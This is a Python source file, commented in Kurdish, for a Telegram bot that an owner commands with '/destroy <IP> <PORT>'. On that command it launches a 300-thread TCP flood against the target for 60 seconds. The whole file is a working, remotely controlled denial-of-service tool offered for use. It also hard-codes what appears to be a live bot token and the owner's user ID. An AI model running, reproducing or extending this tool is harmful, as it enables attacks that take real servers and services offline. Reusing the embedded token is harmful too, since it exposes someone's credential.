import asyncio
import socket
import threading
import sys
import time
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# توکنی بۆتی تلگرامەکەت لێرە دادەنێیت
TOKEN = "9083609558:AAFBj4PLZ1ImUrH1GdzcJASmfiEg1ChDjdA"
# ناوی کاربەری خۆت یان ئایدیەت بۆ ئەوەی تەنها خۆت بۆتەکە کۆنتڕۆڵ بکەیت
OWNER_ID = 5527152252  # ئایدی تلگرامی خۆت لێرە بنووسە

def flood_worker(ip, port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, int(port)))
            payload = b"\xfe\x01\x02\x03\x04\x05\x06\x07\x08\xff" * 150
            for _ in range(50):
                s.send(payload)
        except Exception:
            pass
        finally:
            try:
                s.close()
            except:
                pass

def start_attack_thread(ip, port, duration=60):
    threads_count = 300
    for _ in range(threads_count):
        t = threading.Thread(target=flood_worker, args=(ip, port, duration))
        t.daemon = True
        t.start()

# فەنکشنی فەرمانی /destroy لە تلگرام
async def destroy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # دڵنیابوونەوە لەوەی تەنها خاوەن فەرمانەکە بەکاربێنێت
    if user_id != OWNER_ID:
        await update.message.reply_text("💀 تۆ ڕێگەپێدراو نییت، ئەم بۆتە تەنها بۆ خاوەنە (@alonee427)!")
        return

    args = context.args
    if len(args) < 2:
        await update.message.reply_text("🔥 هەڵە لە فەرمان! بەکارهێنان:\n`/destroy <IP> <PORT>`")
        return

    ip = args[0]
    port = args[1]

    await update.message.reply_text(f"🌋 **هێرشی بۆڕکان دەستی پێکرد!**\n🎯 ئامانج: `{ip}:{port}`\n⚡️ بارودۆخ: توند و بێبەزەیی...")

    # دەستپێکردنی هێرشەکە لە پشتەوە (Background Thread)
    threading.Thread(target=start_attack_thread, args=(ip, port, 60)).start()
    
    await update.message.reply_text(f"💀 شەپۆلی هێرشەکە سەرکەوتووانە نێردرا بۆ سێرڤەرەکە!")

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("destroy", destroy_command))
    
    print("💀 بۆتی تلگرام ئامادەیە و چاوەڕێی فەرمانی خاوەن دەکات...")
    app.run_polling()

if __name__ == "__main__":
    main()
